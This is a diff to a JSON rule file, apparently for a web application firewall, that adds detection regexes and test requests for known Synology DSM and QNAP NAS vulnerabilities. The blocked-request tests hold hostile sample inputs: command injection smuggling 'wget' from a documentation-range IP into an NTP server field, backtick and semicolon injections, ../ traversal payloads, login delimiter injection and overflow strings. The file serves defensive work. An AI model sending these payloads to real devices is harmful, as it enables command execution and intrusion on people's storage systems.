@@ -12,7 +12,7 @@
      "spec": {
       "target": "arg",
       "arg": "api|compound",
-      "regex": "(?:^|[^a-z0-9_.])syno\\.(?:core\\.(?:taskscheduler|eventscheduler|terminal|certificate|snmp|tftp|portforwarding|cms|apppriv|actionpriv|iscsi|security|network\\.[a-z0-9]+|service|fileserv\\.(?:ftp|nfs|rsync|afp|webdav)|ezinternet|resetadmin|hardware|quota|group|share\\.snapshot|package\\.(?:installation|uninstallation|feed|setting))|storage\\.cgi|docker|backup|dr|btrfs\\.replica)(?:[^a-z0-9]|$)",
+      "regex": "(?:^|[^a-z0-9_.])syno\\.(?:core\\.(?:taskscheduler|eventscheduler|terminal|certificate|snmp|tftp|portforwarding|cms|apppriv|actionpriv|iscsi|security(?:scan)?|network\\.[a-z0-9]+|service|fileserv\\.(?:ftp|nfs|rsync|afp|webdav)|ezinternet|resetadmin|hardware|quota|group|share\\.snapshot|package\\.(?:installation|uninstallation|feed|setting))|storage\\.cgi|docker|backup|dr|btrfs\\.replica)(?:[^a-z0-9]|$)",
       "msg": "Synology DSM administration API from outside",
       "reference": "https://www.synology.com/en-global/security/advisory/Synology_SA_20_26",
       "source": "external"
@@ -39,6 +39,11 @@
       },
       {
        "path": "/webapi/entry.cgi?api=SYNO.Docker.Container&version=1&method=create",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/webapi/entry.cgi?api=SYNO.Core.SecurityScan.Operation&version=1&method=start&items=ALL",
        "method": "GET",
        "expect": 403
       },
@@ -86,8 +91,8 @@
      "spec": {
       "target": "arg",
       "arg": "compound",
-      "regex": "\\\\u00[0-7][0-9a-f]",
-      "msg": "Synology DSM compound request with escaped ASCII",
+      "regex": "\\\\u00[0-7][0-9a-f]|plugin_value_(?:start|end)|ld_(?:preload|debug_output|library_path|audit)\\s*=",
+      "msg": "Synology DSM compound request with escaped ASCII or login delimiters",
       "reference": "",
       "source": "external"
      },
@@ -98,13 +103,26 @@
        "expect": 403
       },
       {
+       "path": "/webapi/entry.cgi",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+       },
+       "body": "api=SYNO.Entry.Request&version=1&method=request&compound=%5B%7B%22api%22%3A%22SYNO.API.Auth%22%2C%22method%22%3A%22login%22%2C%22version%22%3A7%2C%22account%22%3A%22admin%20PLUGIN_VALUE_END%22%7D%5D",
+       "expect": 403
+      },
+      {
        "path": "/webapi/entry.cgi?api=SYNO.Entry.Request&version=1&method=request&compound=%5B%7B%22api%22%3A%22SYNO.Core.Desktop.Initdata%22%2C%22method%22%3A%22get%22%2C%22version%22%3A1%7D%5D",
        "method": "GET",
        "expect": 200
       }
      ],
-     "refs": [],
-     "cves": []
+     "refs": [
+      "https://www.synology.com/en-global/security/advisory/Synology_SA_24_20"
+     ],
+     "cves": [
+      "CVE-2024-10441"
+     ]
     },
     {
      "id": "login-injection",
@@ -113,7 +131,7 @@
      "spec": {
       "target": "arg",
       "arg": "account|username|passwd|otp_code",
-      "regex": "[\\x00-\\x08\\x0a-\\x1f]|plugin_value_(?:start|end)|ld_(?:preload|debug_output)\\s*=",
+      "regex": "[\\x00-\\x08\\x0a-\\x1f]|plugin_value_(?:start|end)|ld_(?:preload|debug_output|library_path|audit)\\s*=",
       "msg": "Synology DSM login field with control characters (CVE-2024-10441)",
       "reference": "https://www.synology.com/en-global/security/advisory/Synology_SA_24_20",
       "source": "external"
@@ -214,11 +232,6 @@
        "expect": 403
       },
       {
-       "path": "/webman/forget_passwd.cgi?user=admin",
-       "method": "GET",
-       "expect": 403
-      },
-      {
        "path": "/webman/modules/StorageManager/smart.cgi",
        "method": "POST",
        "expect": 403,
@@ -226,11 +239,6 @@
         "Content-Type": "application/x-www-form-urlencoded"
        },
        "body": "action=apply&operation=quick&disk=%2Fdev%2Fsda"
-      },
-      {
-       "path": "/webapi/FileStation/file_share.cgi",
-       "method": "GET",
-       "expect": 403
       },
       {
        "path": "/webman/login.cgi",
@@ -281,11 +289,6 @@
        "expect": 403
       },
       {
-       "path": "/photo/include/synotheme_upload.php?action=logo_upload",
-       "method": "GET",
-       "expect": 403
-      },
-      {
        "path": "/photo/",
        "method": "GET",
        "expect": 200
@@ -320,7 +323,7 @@
      "needs": [],
      "spec": {
       "target": "arg",
-      "arg": "path|folder_path|dest_folder_path|real_path|dsm_path|file_path|dlink|name|filename",
+      "arg": "path|folder_path|dest_folder_path|real_path|dsm_path|file_path|dlink|name|filename|dest_file_path|goto_path|new_name|to_parent_folder|files|destination",
       "regex": "(?:^|[\\\\/\\x22\\x27])\\.\\.(?:[\\\\/\\x22\\x27]|$)",
       "msg": "Synology DSM file path with ../ from outside",
       "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-15893",
@@ -333,7 +336,7 @@
        "expect": 403
       },
       {
-       "path": "/webapi/entry.cgi?api=SYNO.FolderSharing.List&version=2&method=list&folder_path=%2F..%2F..%2Fetc",
+       "path": "/webapi/entry.cgi?api=SYNO.SynologyDrive.Files&version=2&method=copy&files=%5B%22%2Fmydrive%2Fa.txt%22%5D&to_parent_folder=%22%2Fmydrive%2F..%2F..%2Fvolume1%22",
        "method": "GET",
        "expect": 403
       },
@@ -599,7 +602,7 @@
      "spec": {
       "path": {
        "mode": "regex",
-       "value": "^/webapi/[A-Za-z0-9_]{1,40}\\.cgi(?:/[A-Za-z0-9._]{1,120})?$"
+       "value": "^/webapi/(?:[A-Za-z0-9_]{1,40}/)?[A-Za-z0-9_]{1,40}\\.cgi(?:/[A-Za-z0-9._]{1,120})?$"
       },
       "method": "POST",
       "source": "all",
@@ -629,7 +632,7 @@
      "spec": {
       "path": {
        "mode": "regex",
-       "value": "^/webapi/[A-Za-z0-9_]{1,40}\\.cgi(?:/[A-Za-z0-9._]{1,120})?$"
+       "value": "^/webapi/(?:[A-Za-z0-9_]{1,40}/)?[A-Za-z0-9_]{1,40}\\.cgi(?:/[A-Za-z0-9._]{1,120})?$"
       },
       "method": "POST",
       "source": "all",
@@ -656,7 +659,7 @@
      "spec": {
       "path": {
        "mode": "regex",
-       "value": "^/webapi/[A-Za-z0-9_]{1,40}\\.cgi(?:/[A-Za-z0-9._]{1,120})?$"
+       "value": "^/webapi/(?:[A-Za-z0-9_]{1,40}/)?[A-Za-z0-9_]{1,40}\\.cgi(?:/[A-Za-z0-9._]{1,120})?$"
       },
       "method": "POST",
       "source": "all",
@@ -674,6 +677,15 @@
         "Content-Type": "text/plain;charset=UTF-8"
        },
        "body": "data=%7B%7D",
+       "expect": 200
+      },
+      {
+       "path": "/webapi/AudioStation/info.cgi",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "text/plain;charset=UTF-8"
+       },
+       "body": "api=SYNO.AudioStation.Info&version=1&method=getinfo",
        "expect": 200
       }
      ],
@@ -831,7 +843,7 @@
      "needs": [],
      "spec": {
       "target": "arg",
-      "arg": "g|filename|file|path|name|source_path|dest_path|source_file|f|album|folder|dir",
+      "arg": "g|filename|file|path|name|source_path|dest_path|source_file|f|album|folder|dir|file_name|dest_folder|source_name|dest_name|node|extract_file|compress_name|compress_file|upload_root_dir|upload_name",
       "regex": "(?:^|[\\\\/\\x22\\x27])\\.\\.(?:[\\\\/\\x22\\x27]|$)",
       "msg": "QNAP file name or path with ../ from outside",
       "reference": "https://www.qnap.com/en/security-advisory/qsa-22-24",
@@ -854,6 +866,11 @@
       },
       {
        "path": "/cgi-bin/filemanager/utilRequest.cgi?func=get_list&path=/Public/../../etc",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/cgi-bin/filemanager/utilRequest.cgi?func=rename&sid=k8z2m4q1&path=%2FPublic&source_name=a.txt&dest_name=..%2F..%2F..%2Fetc%2Fx",
        "method": "GET",
        "expect": 403
       },
@@ -1012,8 +1029,8 @@
      "spec": {
       "target": "header",
       "header": "Cookie",
-      "regex": "(?:^|;)\\s*[Qq](?:[Pp][Ss]|[Mm][Ss]|[Mm][Mm][Ss])_[Ss][Ii][Dd]=[^;]*[|&$\\x60<>()\\x22\\x27\\\\]",
-      "msg": "QNAP session cookie with shell characters (authLogout.cgi)",
+      "regex": "(?:^|;)\\s*(?:[Qq](?:[Pp][Ss]|[Mm][Ss]|[Mm][Mm][Ss])|[Nn][Aa][Ss])_[Ss][Ii][Dd]=[^;]*(?:[|&$\\x60<>()\\x22\\x27\\\\]|\\.\\.[/\\\\])",
+      "msg": "QNAP session cookie with shell characters or ../",
       "reference": "https://blog.netlab.360.com/in-the-wild-qnap-nas-attacks-en/",
       "source": "external"
      },
@@ -1035,6 +1052,14 @@
        "expect": 403
       },
       {
+       "path": "/photo/p/api/video.php",
+       "method": "GET",
+       "headers": {
+        "Cookie": "QMS_SID=../../../../mnt/ext/opt/photostation2/x.php"
+       },
+       "expect": 403
+      },
+      {
        "path": "/cgi-bin/authLogout.cgi",
        "method": "GET",
        "headers": {
@@ -1044,9 +1069,12 @@
       }
      ],
      "refs": [
-      "https://blog.netlab.360.com/in-the-wild-qnap-nas-attacks-en/"
+      "https://blog.netlab.360.com/in-the-wild-qnap-nas-attacks-en/",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2019/CVE-2019-7194.yaml"
      ],
-     "cves": []
+     "cves": [
+      "CVE-2019-7193"
+     ]
     },
     {
      "id": "photo-station",
@@ -1097,6 +1125,171 @@
       "CVE-2019-7194",
       "CVE-2019-7195",
       "CVE-2022-27593"
+     ]
+    },
+    {
+     "id": "xff-injection",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "header",
+      "header": "X-Forwarded-For",
+      "regex": "[;|&$\\x60<>(){}\\x22\\x27\\\\\\x0a\\x0d]|^.{512}",
+      "msg": "QNAP X-Forwarded-For with shell characters or over 512 bytes",
+      "reference": "https://www.zerodayinitiative.com/advisories/ZDI-17-1004/",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/cgi-bin/authLogin.cgi",
+       "method": "GET",
+       "headers": {
+        "X-Forwarded-For": "203.0.113.9;id>/tmp/x"
+       },
+       "expect": 403
+      },
+      {
+       "path": "/cgi-bin/authLogin.cgi",
+       "method": "GET",
+       "headers": {
+        "X-Forwarded-For": "203.0.113.9, 198.51.100.7"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://cveawg.mitre.org/api/cve/CVE-2026-34007",
+      "https://www.zerodayinitiative.com/advisories/ZDI-17-1004/",
+      "https://labs.watchtowr.com/qnap-qts-qnapping-at-the-wheel-cve-2024-27130-and-friends/"
+     ],
+     "cves": [
+      "CVE-2026-34007",
+      "CVE-2017-17029",
+      "CVE-2024-27131"
+     ]
+    },
+    {
+     "id": "token-shell-chars",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg",
+      "arg": "specific_server|pid|hash",
+      "regex": "[\\x60;|&<>]|\\$[({]",
+      "msg": "QNAP NTP server, task id or hash with shell characters (CVE-2023-47565)",
+      "reference": "https://www.akamai.com/blog/security-research/2023/dec/qnap-viostor-zero-day-vulnerability-spreading-mirai-patched",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/cgi-bin/server/server.cgi?func=server02_main_submit&counter=8.54&APPLY=",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+       },
+       "body": "time_mode=2&CONFIGURE_NTP=on&SPECIFIC_SERVER=pool.example.com%3Bwget+http%3A%2F%2F203.0.113.5%2Fx",
+       "expect": 403
+      },
+      {
+       "path": "/cgi-bin/filemanager/utilRequest.cgi?func=cancel_trash_recovery&sid=k8z2m4q1&pid=%60id%60",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/cgi-bin/filemanager/utilRequest.cgi?func=get_compress_status&sid=k8z2m4q1&pid=12345",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://www.akamai.com/blog/security-research/2023/dec/qnap-viostor-zero-day-vulnerability-spreading-mirai-patched",
+      "https://www.exploit-db.com/exploits/41842",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+     ],
+     "cves": [
+      "CVE-2023-47565",
+      "CVE-2017-6359",
+      "CVE-2017-6360"
+     ]
+    },
+    {
+     "id": "overlong-login",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg",
+      "arg": "password|old_password|user_name|lang|q_lang|security_answer",
+      "regex": ".{1024}",
+      "msg": "QNAP password, user name or language longer than 1024 (overflow)",
+      "reference": "https://www.zerodayinitiative.com/advisories/ZDI-17-1006/",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/cgi-bin/sysinfoReq.cgi?lang=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/cgi-bin/sysinfoReq.cgi?lang=ENG",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://www.zerodayinitiative.com/advisories/ZDI-17-1003/",
+      "https://www.zerodayinitiative.com/advisories/ZDI-17-1006/",
+      "https://www.zerodayinitiative.com/advisories/ZDI-17-1007/",
+      "https://www.zerodayinitiative.com/advisories/ZDI-17-1008/"
+     ],
+     "cves": [
+      "CVE-2017-17028",
+      "CVE-2017-17031",
+      "CVE-2017-17032",
+      "CVE-2017-17033"
+     ]
+    },
+    {
+     "id": "upload-name-overflow",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "upload_name",
+      "regex": "[^/\\\\]{256}",
+      "msg": "QNAP upload file name over 255 bytes (File Station overflow)",
+      "reference": "https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-013.txt",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/share.cgi?ssid=k8z2m4q1&func=upload&upload_root_dir=%2F&dest_path=%2F",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "multipart/form-data; boundary=jtq049"
+       },
+       "body": "--jtq049\r\nContent-Disposition: form-data; name=\"file\"; filename=\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\r\nContent-Type: application/octet-stream\r\n\r\nx\r\n--jtq049--\r\n",
+       "expect": 403
+      },
+      {
+       "path": "/share.cgi?ssid=k8z2m4q1&func=upload&upload_root_dir=%2F&dest_path=%2F",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "multipart/form-data; boundary=jtq049"
+       },
+       "body": "--jtq049\r\nContent-Disposition: form-data; name=\"file\"; filename=\"photos/2026/IMG_0001.HEIC\"\r\nContent-Type: application/octet-stream\r\n\r\nx\r\n--jtq049--\r\n",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-013.txt",
+      "https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-014.txt",
+      "https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-015.txt",
+      "https://blog.syss.com/posts/qnap/"
+     ],
+     "cves": [
+      "CVE-2026-26239",
+      "CVE-2026-26240",
+      "CVE-2026-26241"
      ]
     },
     {
